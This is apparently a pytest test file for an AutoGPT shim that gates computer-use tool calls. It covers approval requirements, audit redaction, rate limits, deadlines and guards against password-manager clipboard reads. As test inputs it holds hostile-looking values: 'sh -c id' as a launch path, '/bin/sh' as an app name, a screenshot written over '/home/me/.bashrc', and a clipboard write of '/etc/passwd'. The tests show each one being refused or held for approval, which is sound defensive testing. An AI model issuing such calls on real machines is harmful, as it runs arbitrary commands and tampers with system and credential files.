        "get_desktop_state": ["screenshot_out_file"],
        "get_window_state": ["screenshot_out_file"],
        "launch_app": [
            "additional_arguments",
            "launch_path",
            "path",
            "urls",
            "webkit_inspector_port",
        ],
        "run_script": ["script"],
    }


async def test_a_launch_that_runs_a_command_line_waits_for_approval(make_handler, fake_log) -> None:
    """cua-driver starts a launch_path or a program with extra arguments in
    the background, with no window of its own, so a launch ran any command
    with no more than the supervisor's say in Auto."""
    handler = make_handler()
    arguments = {"launch_path": "sh -c id"}

    waiting = await handler.handle(_call("launch_app", arguments))
    approved = await handler.handle(
        _call("launch_app", arguments, approved_arguments=["launch_path"])
    )

    assert isinstance(waiting, ErrorMessage)
    assert waiting.payload.code == ErrorCode.APPROVAL_REQUIRED
    assert waiting.payload.details == {"tool": "launch_app", "argument": "launch_path"}
    assert isinstance(approved, ComputerToolResultMessage)
    [call] = _records(fake_log, "call")
    assert call["arguments"]["launch_path"] == "sh -c id"


async def test_a_call_is_relayed_with_this_sessions_label(make_handler, fake_log, tmp_path) -> None:
    handler = make_handler()

    response = await handler.handle(_call("type_text", {"pid": 5, "text": "hunter2"}))

    assert isinstance(response, ComputerToolResultMessage)
    assert response.payload.tool == "type_text"
    assert response.payload.is_error is False
    [call] = _records(fake_log, "call")
    assert call["arguments"] == {"pid": 5, "text": "hunter2", "session": handler.session_label}
    assert handler.session_label.startswith("autogpt-")
    # What was typed stays out of the audit log.
    [record] = _audit(tmp_path)
    assert record["details"]["arguments"]["text"] == {"redacted_chars": 7}
    assert "hunter2" not in (tmp_path / "audit.log").read_text()
    assert record["result"]["ok"] is True


async def test_the_platform_cannot_choose_the_session(make_handler, fake_log) -> None:
    handler = make_handler()

    await handler.handle(_call("click", {"pid": 5, "session": "someone-else"}))

    [call] = _records(fake_log, "call")
    assert call["arguments"]["session"] == handler.session_label


async def test_a_session_the_driver_ended_goes_on_under_a_new_label(
    make_handler, fake_log, monkeypatch
) -> None:
    # cua-driver ends a named session left idle for five minutes and refuses
    # every later call naming it.
    handler = make_handler()
    ended = handler.session_label
    monkeypatch.setenv("FAKE_CUA_ENDED_SESSIONS", ended)

    first = await handler.handle(_call("click", {"pid": 5}))
    second = await handler.handle(_call("click", {"pid": 6}))

    for response in (first, second):
        assert isinstance(response, ComputerToolResultMessage)
        assert response.payload.is_error is False
    calls = _records(fake_log, "call")
    assert [call["arguments"]["session"] for call in calls] == [ended, f"{ended}.1", f"{ended}.1"]
    assert [call["arguments"]["pid"] for call in calls] == [5, 5, 6]
    assert handler.session_label == f"{ended}.1"


async def test_hellos_screen_size_survives_an_ended_session(
    make_handler, fake_log, monkeypatch
) -> None:
    handler = make_handler()
    monkeypatch.setenv("FAKE_CUA_ENDED_SESSIONS", handler.session_label)

    assert await handler.screen_size() == (1920, 1080)


async def test_a_refusal_for_another_reason_is_not_sent_again(
    make_handler, fake_log, monkeypatch
) -> None:
    handler = make_handler()
    label = handler.session_label
    monkeypatch.setenv("FAKE_CUA_ENDED_SESSIONS", "autogpt-someone-else")

    response = await handler.handle(_call("click", {"pid": 5}))

    assert isinstance(response, ComputerToolResultMessage)
    [call] = _records(fake_log, "call")
    assert call["arguments"]["session"] == label == handler.session_label


async def test_sessions_get_their_own_labels(make_handler) -> None:
    assert make_handler(session_id="a").session_label != make_handler(session_id="b").session_label


async def test_the_drivers_own_error_comes_back_as_a_result(make_handler) -> None:
    handler = make_handler()

    response = await handler.handle(_call("zoom", {"pid": -1}))

    assert isinstance(response, ComputerToolResultMessage)
    assert response.payload.is_error is True
    assert response.payload.structured_content == {"code": "stale"}


@pytest.mark.parametrize(
    ("tool", "arguments"),
    [
        ("kill_app", {"pid": 1}),
        ("set_config", {}),
        ("clipboard_read", {}),
        ("check_permissions", {"prompt": True}),
        (
            "run_steps",
            {
                "steps": [{"tool": "move_cursor", "args": {"x": 1, "y": 1}}],
                "observe": {"pid": 1, "window_id": 2, "screenshot_out_file": "/home/me/.bashrc"},
            },
        ),
        ("launch_app", {"name": "/bin/sh"}),
    ],
)
async def test_refused_calls_never_reach_the_driver(
    make_handler, fake_log, tmp_path, tool, arguments
) -> None:
    handler = make_handler()

    response = await handler.handle(_call(tool, arguments))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.FEATURE_NOT_SUPPORTED
    assert _records(fake_log, "call") == []
    [record] = _audit(tmp_path)
    assert record["result"]["error_code"] == ErrorCode.FEATURE_NOT_SUPPORTED.value


async def test_a_disk_argument_nobody_approved_never_reaches_the_driver(
    make_handler, fake_log, tmp_path
) -> None:
    handler = make_handler()

    response = await handler.handle(
        _call("get_window_state", {"pid": 1, "screenshot_out_file": "/home/me/.bashrc"})
    )

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.APPROVAL_REQUIRED
    assert response.payload.details == {
        "tool": "get_window_state",
        "argument": "screenshot_out_file",
    }
    assert _records(fake_log, "call") == []
    [record] = _audit(tmp_path)
    assert record["result"]["error_code"] == ErrorCode.APPROVAL_REQUIRED.value


async def test_a_script_runs_only_once_the_person_approves_it(
    make_handler, fake_log, tmp_path
) -> None:
    """cua-driver 0.38's policy can't forbid one argument of a tool, and the
    shim can't see a script's calls, so a script could save a screenshot
    anywhere without the approval the same call needs on its own."""
    handler = make_handler()
    script = (
        'await cua.call("get_window_state", '
        '{pid: 1, window_id: 2, screenshot_out_file: "~/Desktop/shot.png"})'
    )

    waiting = await handler.handle(_call("run_script", {"script": script}))
    approved = await handler.handle(
        _call("run_script", {"script": script}, approved_arguments=["script"])
    )

    assert isinstance(waiting, ErrorMessage)
    assert waiting.payload.code == ErrorCode.APPROVAL_REQUIRED
    assert waiting.payload.details == {"tool": "run_script", "argument": "script"}
    assert isinstance(approved, ComputerToolResultMessage)
    [call] = _records(fake_log, "call")
    assert call["arguments"]["script"] == script


async def test_an_approved_disk_argument_is_relayed_and_audited_whole(
    make_handler, fake_log, tmp_path
) -> None:
    handler = make_handler()
    path = "/home/me/Documents/" + "quarterly-report-" * 20 + ".png"

    response = await handler.handle(
        _call(
            "get_window_state",
            {"pid": 1, "screenshot_out_file": path},
            approved_arguments=["screenshot_out_file"],
        )
    )

    assert isinstance(response, ComputerToolResultMessage)
    [call] = _records(fake_log, "call")
    assert call["arguments"]["screenshot_out_file"] == path
    [record] = _audit(tmp_path)
    assert record["details"]["approved_arguments"] == ["screenshot_out_file"]
    # The audit keeps the whole path the person approved.
    assert record["details"]["arguments"]["screenshot_out_file"] == path


async def test_an_approval_covers_only_the_argument_it_names(make_handler, fake_log) -> None:
    handler = make_handler(enable_clipboard=True)

    response = await handler.handle(
        _call("clipboard_write", {"file_path": "/etc/passwd"}, approved_arguments=["image_path"])
    )

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.APPROVAL_REQUIRED
    assert _records(fake_log, "call") == []


async def test_arguments_the_driver_rejects_come_back_for_the_model_to_fix(
    make_handler, tmp_path
) -> None:
    handler = make_handler()

    response = await handler.handle(_call("set_window_frame", {"pid": -4}))

    assert isinstance(response, ComputerToolResultMessage)
    assert response.payload.is_error is True
    assert response.payload.content[0].text == "width must be positive"
    [record] = _audit(tmp_path)
    assert record["result"]["ok"] is True and record["details"]["is_error"] is True


async def test_another_driver_protocol_error_is_an_internal_error(make_handler, tmp_path) -> None:
    handler = make_handler()

    response = await handler.handle(_call("set_window_frame", {"pid": -5}))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.INTERNAL_ERROR
    [record] = _audit(tmp_path)
    assert record["result"]["error_code"] == ErrorCode.INTERNAL_ERROR.value


async def test_what_launches_is_audited_whole(make_handler, tmp_path) -> None:
    handler = make_handler()
    long_argument = "--profile=" + "p" * 300

    await handler.handle(
        _call("launch_app", {"name": "Terminal", "additional_arguments": [long_argument]})
    )

    [record] = _audit(tmp_path)
    assert record["details"]["arguments"]["additional_arguments"] == [long_argument]


async def test_computer_use_off_refuses_everything(make_handler) -> None:
    handler = make_handler(enable_computer_use=False)

    response = await handler.handle(_call("click", {"pid": 1}))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.CAPABILITY_NOT_GRANTED


async def test_screenshots_are_relayed_up_to_the_rate_limit(make_handler) -> None:
    handler = make_handler(max_screenshots_per_minute=1)

    first = await handler.handle(_call("get_window_state", {"pid": 1}))
    second = await handler.handle(_call("get_window_state", {"pid": 1}))

    assert isinstance(first, ComputerToolResultMessage)
    images = [b for b in first.payload.content if isinstance(b, ComputerImageContent)]
    assert [image.mime_type for image in images] == ["image/png"]
    # The resource block the driver also sent is named, not relayed.
    texts = [b.text for b in first.payload.content if isinstance(b, ComputerTextContent)]
    assert texts[0] == "window" and "A resource block was left out." in texts
    assert isinstance(second, ComputerToolResultMessage)
    assert not [b for b in second.payload.content if isinstance(b, ComputerImageContent)]
    audit = [r["details"] for r in _audit(handler.config.audit_log_path.parent)]
    assert [(d["images"], d["images_withheld"]) for d in audit] == [(1, 0), (0, 1)]
    assert any("at most 1 a minute" in b.text for b in second.payload.content
               if isinstance(b, ComputerTextContent))  # fmt: skip


async def test_an_image_left_out_for_size_spends_none_of_the_rate_limit(
    make_handler, monkeypatch
) -> None:
    """The limiter, which every session on the machine shares, was charged
    before the size check, so full-size captures that never left the
    machine used it up and withheld the next screenshots, with a note
    blaming the rate."""
    from autogpt_local_executor import handlers

    monkeypatch.setenv("FAKE_CUA_IMAGE_BYTES", "4000")
    handler = make_handler(max_screenshots_per_minute=2)

    monkeypatch.setattr(handlers, "MAX_WIRE_BASE64_CONTENT_BYTES", 1000)
    too_large = [await handler.handle(_call("get_window_state", {"pid": 1})) for _ in range(3)]
    monkeypatch.setattr(handlers, "MAX_WIRE_BASE64_CONTENT_BYTES", 100_000)
    small = await handler.handle(_call("get_window_state", {"pid": 1}))

    for response in too_large:
        assert isinstance(response, ComputerToolResultMessage)
        texts = [b.text for b in response.payload.content if isinstance(b, ComputerTextContent)]
        assert any("too large" in text for text in texts)
        assert not any("a minute" in text for text in texts)
    assert isinstance(small, ComputerToolResultMessage)
    assert [b for b in small.payload.content if isinstance(b, ComputerImageContent)]


async def test_an_image_too_large_for_the_connection_is_left_out(make_handler, monkeypatch) -> None:
    from autogpt_local_executor import handlers

    monkeypatch.setattr(handlers, "MAX_WIRE_BASE64_CONTENT_BYTES", 1000)
    monkeypatch.setenv("FAKE_CUA_IMAGE_BYTES", "4000")
    handler = make_handler()

    response = await handler.handle(_call("get_window_state", {"pid": 1}))

    assert isinstance(response, ComputerToolResultMessage)
    assert not [b for b in response.payload.content if isinstance(b, ComputerImageContent)]
    assert any("too large" in b.text for b in response.payload.content
               if isinstance(b, ComputerTextContent))  # fmt: skip
    # The audit record counted only images the rate limit held back, so it
    # said none were withheld.
    [record] = _audit(handler.config.audit_log_path.parent)
    assert (record["details"]["images"], record["details"]["images_withheld"]) == (0, 1)


async def test_an_image_past_the_negotiated_payload_limit_is_left_out(
    make_handler, monkeypatch
) -> None:
    """A result was held only to the frame's budget, so with a lower
    negotiated max_file_size_bytes, which bounds every operation's payload
    (PROTOCOL.md), a screenshot could exceed the limit the platform set."""
    monkeypatch.setenv("FAKE_CUA_IMAGE_BYTES", "4000")
    handler = make_handler()
    handler.config.max_file_size_bytes = 1000

    response = await handler.handle(_call("get_window_state", {"pid": 1}))

    assert isinstance(response, ComputerToolResultMessage)
    assert not [b for b in response.payload.content if isinstance(b, ComputerImageContent)]
    assert any("too large" in b.text for b in response.payload.content
               if isinstance(b, ComputerTextContent))  # fmt: skip


async def test_text_is_measured_as_json_writes_it(make_handler, monkeypatch) -> None:
    """The budget counted a text block's raw UTF-8 bytes, but JSON writes a
    control character as six bytes and a quote as two, so a result could
    pass the budget and still exceed the frame limit, and the whole result
    was then replaced with FILE_TOO_LARGE."""
    from autogpt_local_executor import handlers

    monkeypatch.setattr(handlers, "MAX_WIRE_BASE64_CONTENT_BYTES", 1000)
    monkeypatch.setattr(handlers, "MAX_WIRE_TEXT_CONTENT_BYTES", 100)
    handler = make_handler()

    payload, _summary = handler._result_payload(
        "get_window_state", {"content": [{"type": "text", "text": "\x00" * 600}]}
    )

    texts = [b.text for b in payload.content if isinstance(b, ComputerTextContent)]
    assert sum(len(json.dumps(text, ensure_ascii=False).encode()) for text in texts) <= 1000
    assert any("cut down" in text for text in texts)


async def test_a_call_past_its_timeout_is_stopped_at_the_driver(
    make_handler, fake_log, monkeypatch
) -> None:
    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "3")
    handler = make_handler()

    response = await handler.handle(_call("drag", {"pid": -2}, timeout_seconds=1))
    after = await handler.handle(_call("click", {"pid": 1}))
    await asyncio.sleep(2.5)

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.COMMAND_TIMEOUT
    assert "stopped cua-driver" in response.payload.message
    assert response.payload.details == {"tool": "drag", "timeout_seconds": 1, "started": True}
    assert isinstance(after, ComputerToolResultMessage)
    assert _records(fake_log, "slow_done") == []


async def test_a_call_kept_waiting_past_its_deadline_never_starts(
    make_handler, fake_log, monkeypatch
) -> None:
    """The deadline started only once the call had the computer, so a call
    queued behind another chat's could start its action after the platform
    had given up on it, on a screen that had changed since."""
    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "2")
    first = make_handler(session_id=None)
    second = make_handler(session_id="other-chat")
    first.share_with(second)
    slow = asyncio.create_task(first.handle(_call("drag", {"pid": -2}, timeout_seconds=30)))
    for _ in range(250):
        if _records(fake_log, "call"):
            break
        await asyncio.sleep(0.02)

    queued = await second.handle(_call("click", {"pid": 7}, timeout_seconds=1))
    await slow

    assert isinstance(queued, ErrorMessage)
    assert queued.payload.code == ErrorCode.COMMAND_TIMEOUT
    assert queued.payload.details == {"tool": "click", "timeout_seconds": 1, "started": False}
    assert "Nothing ran" in queued.payload.message
    assert [r["tool"] for r in _records(fake_log, "call")] == ["drag"]


class _HeldStart:
    """A client factory whose drivers don't finish starting until `go` is
    set, counting the starts."""

    def __init__(self) -> None:
        self.go = asyncio.Event()
        self.starting = asyncio.Event()
        self.started: list[StdioMcpClient] = []

    def __call__(self, argv: list[str], **kwargs: Any) -> StdioMcpClient:
        held = self

        class Held(StdioMcpClient):
            async def start(self, *, timeout: float) -> Any:
                held.starting.set()
                await held.go.wait()
                return await super().start(timeout=timeout)

        client = Held([sys.executable, *argv], **kwargs)
        self.started.append(client)
        return client


async def test_a_call_gives_up_on_a_slow_start_and_leaves_it_running(fake_log) -> None:
    """Starting the driver on a call's first use ignored the call's deadline,
    holding the driver's turn for as long as the start took, which kept
    HELLO's screen size and other chats' calls waiting past theirs. The
    start isn't stopped either: that would count against the restart
    budget."""
    held = _HeldStart()
    bridge = CuaDriverBridge(
        tools=catalog.offered_tools(enable_clipboard=False),
        binary=FAKE,
        platform="linux",
        client_factory=held,
    )
    try:
        first = asyncio.ensure_future(bridge.call_tool("get_screen_size", {}, timeout=0.3))
        done, _ = await asyncio.wait({first}, timeout=20)
        assert first in done
        with pytest.raises(driver.CallNotStarted):
            first.result()
        # The driver's turn is free, and the start goes on.
        assert not bridge._turn.locked()
        assert held.starting.is_set() and len(held.started) == 1

        held.go.set()
        result = await bridge.call_tool("get_screen_size", {}, timeout=30)

        assert result["structuredContent"]["width"] == 1920
        assert len(held.started) == 1
        assert held.started[0].alive
    finally:
        held.go.set()
        await bridge.close()


async def test_a_call_whose_deadline_passes_while_the_driver_starts_never_runs(
    tmp_path, fake_log
) -> None:
    held = _HeldStart()
    config = _config(tmp_path)
    handler = ComputerUseHandler(
        config,
        audit=AuditWriter(config.audit_log_path, b"a" * 32),
        driver=CuaDriverBridge(
            tools=catalog.offered_tools(enable_clipboard=False),
            binary=FAKE,
            platform="linux",
            client_factory=held,
        ),
    )
    try:
        call = asyncio.ensure_future(handler.handle(_call("click", {"pid": 7}, timeout_seconds=1)))
        done, _ = await asyncio.wait({call}, timeout=20)
        assert call in done
        response = call.result()

        assert isinstance(response, ErrorMessage)
        assert response.payload.code == ErrorCode.COMMAND_TIMEOUT
        assert response.payload.details == {"tool": "click", "timeout_seconds": 1, "started": False}
        assert "starting" in response.payload.message
        assert _records(fake_log, "call") == []
    finally:
        held.go.set()
        await handler.close()


async def test_the_deadline_counts_from_when_the_shim_received_the_call(
    make_handler, fake_log
) -> None:
    """Time already spent waiting for a request slot counts too."""
    handler = make_handler()
    received_at = asyncio.get_running_loop().time() - 5

    response = await handler.handle(
        _call("click", {"pid": 7}, timeout_seconds=2), received_at=received_at
    )

    assert isinstance(response, ErrorMessage)
    assert response.payload.details["started"] is False
    assert _records(fake_log, "call") == []


@pytest.mark.parametrize("width", ["NaN", "Infinity"])
async def test_a_screen_size_that_is_not_a_finite_number_is_left_out(
    make_handler, fake_log, monkeypatch, width: str
) -> None:
    """The driver's output is read with Python's json, which takes NaN and
    Infinity, and int() of either raised, so HELLO failed instead of going
    out without the size."""
    monkeypatch.setenv("FAKE_CUA_SCREEN", f'{{"width": {width}, "height": 1080}}')
    handler = make_handler()

    assert await handler.screen_size() is None


async def test_hello_skips_the_screen_size_rather_than_end_another_call(
    make_handler, fake_log, monkeypatch
) -> None:
    from autogpt_local_executor import handlers

    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "1.5")
    monkeypatch.setattr(handlers, "SCREEN_SIZE_SECONDS", 0.3)
    handler = make_handler()
    slow = asyncio.create_task(handler.handle(_call("drag", {"pid": -2})))
    for _ in range(250):
        if _records(fake_log, "call"):
            break
        await asyncio.sleep(0.02)

    size = await handler.screen_size()
    result = await slow

    assert size is None
    assert isinstance(result, ComputerToolResultMessage)
    assert _records(fake_log, "slow_done")


async def test_a_cancelled_call_is_still_audited(make_handler, tmp_path) -> None:
    handler = make_handler()
    task = asyncio.create_task(handler.handle(_call("drag", {"pid": -2})))
    await asyncio.sleep(1.0)
    task.cancel()
    with pytest.raises(asyncio.CancelledError):
        await task

    [record] = _audit(tmp_path)
    assert record["result"]["error_code"] == "CANCELLED"


async def test_a_driver_that_cannot_start_is_reported(make_handler, monkeypatch) -> None:
    monkeypatch.setenv("FAKE_CUA_VERSION", "1.0.0")
    handler = make_handler()

    response = await handler.handle(ComputerToolsRequestMessage(id=new_id(), ts=now_ts()))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.DEPENDENCY_MISSING


# ── Clipboard rules ──────────────────────────────────────────────────────


async def test_clipboard_reads_return_this_shims_recent_write(make_handler) -> None:
    handler = make_handler(enable_clipboard=True)

    await handler.handle(_call("clipboard_write", {"text": "from the agent"}))
    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ComputerToolResultMessage)
    assert response.payload.structured_content["text"] == "from the agent"


async def test_clipboard_reads_refuse_what_the_shim_did_not_write(make_handler, tmp_path) -> None:
    handler = make_handler(enable_clipboard=True)
    (tmp_path / "clipboard.txt").write_text("the person's password")

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.CLIPBOARD_CONCEALED
    assert response.payload.details == {"reason": "writeback_only"}
    assert "password" not in response.model_dump_json()


async def test_clipboard_reads_refuse_a_write_since_overwritten(make_handler, tmp_path) -> None:
    handler = make_handler(enable_clipboard=True)
    await handler.handle(_call("clipboard_write", {"text": "from the agent"}))
    (tmp_path / "clipboard.txt").write_text("copied by the person")

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ErrorMessage)
    assert response.payload.details == {"reason": "writeback_overwritten"}


async def test_an_approved_file_on_the_clipboard_ends_the_shims_text_writeback(
    make_handler, tmp_path
) -> None:
    handler = make_handler(enable_clipboard=True)
    await handler.handle(_call("clipboard_write", {"text": "from the agent"}))

    response = await handler.handle(
        _call("clipboard_write", {"file_path": "/home/me/cv.pdf"}, approved_arguments=["file_path"])
    )
    read = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ComputerToolResultMessage)
    assert isinstance(read, ErrorMessage)
    assert read.payload.details == {"reason": "writeback_only"}


async def test_clipboard_reads_ask_the_driver_for_the_text(make_handler, fake_log) -> None:
    handler = make_handler(enable_clipboard=True)
    await handler.handle(_call("clipboard_write", {"text": "x"}))

    await handler.handle(_call("clipboard_read", {"include_text": False}))

    read = [r for r in _records(fake_log, "call") if r["tool"] == "clipboard_read"]
    assert read[0]["arguments"]["include_text"] is True


@pytest.fixture
def a_clean_clipboard(monkeypatch: pytest.MonkeyPatch) -> list[concealed.ClipboardState]:
    """The OS's view of the clipboard, one state per look."""
    states: list[concealed.ClipboardState] = []
    from autogpt_local_executor import handlers

    def look(_timeout: float | None = None) -> concealed.ClipboardState:
        return states.pop(0) if states else concealed.ClipboardState(None, 7)

    monkeypatch.setattr(handlers, "clipboard_state", look)
    return states


async def test_foreign_clipboard_reads_return_unmarked_text(
    make_handler, tmp_path, a_clean_clipboard
) -> None:
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("a copied paragraph")

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ComputerToolResultMessage)
    assert response.payload.structured_content["text"] == "a copied paragraph"


@pytest.mark.parametrize("when", ["before", "after"])
async def test_foreign_clipboard_reads_refuse_a_password_managers_copy(
    make_handler, tmp_path, a_clean_clipboard, when: str
) -> None:
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("s3cret")
    marked = concealed.ClipboardState("org.nspasteboard.ConcealedType", 7)
    clean = concealed.ClipboardState(None, 7)
    a_clean_clipboard.extend([marked] if when == "before" else [clean, marked])

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.CLIPBOARD_CONCEALED
    assert response.payload.details["marker"] == "org.nspasteboard.ConcealedType"
    assert "s3cret" not in response.model_dump_json()


async def test_foreign_clipboard_reads_check_the_types_the_driver_read(
    make_handler, tmp_path, a_clean_clipboard, monkeypatch
) -> None:
    monkeypatch.setenv("FAKE_CUA_CLIPBOARD_TYPES", "UTF8_STRING,x-kde-passwordManagerHint")
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("s3cret")

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ErrorMessage)
    assert response.payload.details["marker"] == "x-kde-passwordManagerHint"


async def test_foreign_clipboard_reads_refuse_a_copy_made_during_the_read(
    make_handler, tmp_path, a_clean_clipboard
) -> None:
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("whatever")
    a_clean_clipboard.extend([concealed.ClipboardState(None, 7), concealed.ClipboardState(None, 8)])

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ErrorMessage)
    assert response.payload.details == {"reason": "changed"}


async def test_foreign_clipboard_reads_without_a_sequence_number_read_twice(
    make_handler, tmp_path, a_clean_clipboard
) -> None:
    """Linux keeps no clipboard sequence number, and cua-driver reads the
    types and then the text: a password manager's copy between the two,
    replaced before the shim looked again, came back as clean text."""
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    clipboard = tmp_path / "clipboard.txt"
    clipboard.write_text("s3cret")  # read while its marker went unseen
    a_clean_clipboard.extend([concealed.ClipboardState(None), concealed.ClipboardState(None)])
    driver = handler.driver
    real_call = driver.call_tool

    async def call_tool(name: str, arguments: dict, **kwargs: Any) -> dict:
        result = await real_call(name, arguments, **kwargs)
        if name == "clipboard_read":
            clipboard.write_text("copied after it")  # the clipboard moves on
        return result

    driver.call_tool = call_tool  # type: ignore[method-assign]

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.CLIPBOARD_CONCEALED
    assert response.payload.details == {"reason": "changed"}
    assert "s3cret" not in response.model_dump_json()


async def test_a_second_read_that_finds_the_same_text_returns_it(
    make_handler, tmp_path, a_clean_clipboard
) -> None:
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("a copied paragraph")
    a_clean_clipboard.extend([concealed.ClipboardState(None), concealed.ClipboardState(None)])

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ComputerToolResultMessage)
    assert response.payload.structured_content["text"] == "a copied paragraph"


async def test_a_clipboard_read_whose_deadline_passes_in_the_marker_check_never_starts(
    make_handler, tmp_path, fake_log, monkeypatch
) -> None:
    """The check for a password manager's marker (xclip or wl-paste, up to
    three seconds) ran before the driver's read, which still got the call's
    whole timeout, so the read could start after the deadline."""
    import time

    from autogpt_local_executor import handlers

    def slow_look(_timeout: float | None = None) -> concealed.ClipboardState:
        time.sleep(2)
        return concealed.ClipboardState(None, 7)

    monkeypatch.setattr(handlers, "clipboard_state", slow_look)
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("a copied paragraph")

    response = await handler.handle(_call("clipboard_read", timeout_seconds=1))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.COMMAND_TIMEOUT
    assert response.payload.details["started"] is False
    assert [r for r in _records(fake_log, "call") if r["tool"] == "clipboard_read"] == []


async def test_each_look_at_a_foreign_clipboard_gets_only_the_time_left(
    make_handler, tmp_path, monkeypatch
) -> None:
    """Each check for a password manager's marker could take its own three
    seconds (xclip, wl-paste) whatever the call's deadline, holding the
    computer's turn, which every chat's calls share, past it."""
    from autogpt_local_executor import handlers

    given: list[float | None] = []

    def look(timeout: float | None = None) -> concealed.ClipboardState:
        given.append(timeout)
        return concealed.ClipboardState(None, 7)

    monkeypatch.setattr(handlers, "clipboard_state", look)
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("a copied paragraph")

    response = await handler.handle(_call("clipboard_read", timeout_seconds=2))

    assert isinstance(response, ComputerToolResultMessage)
    assert len(given) == 2
    assert all(timeout is not None and 0 < timeout <= 2 for timeout in given)


async def test_a_second_clipboard_read_never_starts_past_the_deadline(
    make_handler, tmp_path, fake_log, monkeypatch
) -> None:
    """On Linux the shim reads twice. A deadline that passed after the first
    read still started the second, given a millisecond, so it overran and
    the bridge stopped the driver every chat shares."""
    from autogpt_local_executor import handlers

    monkeypatch.setattr(
        handlers, "clipboard_state", lambda _timeout=None: concealed.ClipboardState(None)
    )
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("a copied paragraph")
    loop = asyncio.get_running_loop()
    deadlines: list[float] = []
    real_deadline = handlers.ComputerUseHandler.call_deadline

    def recorded_deadline(msg, received_at=None):
        deadlines.append(real_deadline(msg, received_at))
        return deadlines[-1]

    monkeypatch.setattr(
        handlers.ComputerUseHandler, "call_deadline", staticmethod(recorded_deadline)
    )
    real_call = handler.call_driver
    reads = 0

    async def first_read_runs_to_the_deadline(tool, arguments, **kwargs):
        nonlocal reads
        reads += 1
        result = await real_call(tool, arguments, **kwargs)
        if tool == "clipboard_read" and reads == 1:
            await asyncio.sleep(max(deadlines[0] - loop.time(), 0) + 0.2)
        return result

    monkeypatch.setattr(handler, "call_driver", first_read_runs_to_the_deadline)
    response = await handler.handle(_call("clipboard_read", timeout_seconds=2))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.COMMAND_TIMEOUT
    assert response.payload.details["started"] is True
    assert "a copied paragraph" not in response.model_dump_json()
    assert len([r for r in _records(fake_log, "call") if r["tool"] == "clipboard_read"]) == 1
    assert "stopped cua-driver" not in response.payload.message


def test_marker_in_finds_each_platforms_marker() -> None:
    assert concealed.marker_in(["public.utf8-plain-text"]) is None
    assert concealed.marker_in(None) is None
    assert concealed.marker_in(["org.nspasteboard.ConcealedType"]) == (
        "org.nspasteboard.ConcealedType"
    )
    assert concealed.marker_in(["clipboard viewer ignore"]) == "clipboard viewer ignore"


@pytest.mark.parametrize(
    ("returncode", "stdout", "stderr", "marker"),
    [
        (0, "TARGETS\nUTF8_STRING\n", "", None),
        (0, "UTF8_STRING\nx-kde-passwordManagerHint\n", "", "x-kde-passwordManagerHint"),
        (1, "", "Error: target TARGETS not available", None),
        (1, "", "Error: Can't open display", concealed.UNKNOWN),
    ],
    ids=["plain", "password-manager", "empty", "broken"],
)
def test_linux_clipboard_state_reads_the_targets(
    monkeypatch, returncode: int, stdout: str, stderr: str, marker: str | None
) -> None:
    import subprocess

    monkeypatch.setenv("DISPLAY", ":0")
    monkeypatch.delenv("WAYLAND_DISPLAY", raising=False)
    monkeypatch.setattr(concealed.shutil, "which", lambda name: f"/usr/bin/{name}")
    monkeypatch.setattr(
        concealed.subprocess,
        "run",
        lambda argv, **_: subprocess.CompletedProcess(argv, returncode, stdout, stderr),
    )

    assert concealed._linux_state() == concealed.ClipboardState(marker)


def test_linux_clipboard_state_without_a_tool_counts_as_private(monkeypatch) -> None:
    monkeypatch.setenv("DISPLAY", ":0")
    monkeypatch.setattr(concealed.shutil, "which", lambda _name: None)

    assert concealed._linux_state().marker == concealed.UNKNOWN


# ── Sharing across sessions ──────────────────────────────────────────────


async def test_child_sessions_share_the_driver_and_only_the_parent_stops_it(
    make_handler, fake_log
) -> None:
    parent = make_handler(session_id=None)
    child = make_handler(session_id="child")
    parent.share_with(child)

    await child.handle(_call("click", {"pid": 1}))
    await parent.handle(_call("click", {"pid": 2}))
    assert child.driver is parent.driver
    assert len(_records(fake_log, "initialize")) == 1

    await child.close()
    assert parent.driver._client is not None and parent.driver._client.alive
    await parent.close()
    assert parent.driver._client is None


async def test_text_one_chat_wrote_is_readable_from_another(make_handler) -> None:
    """The clipboard is the computer's: a paste in any window shows another
    chat's write too, so the writeback record is shared, and the
    instructions say so rather than "this session"."""
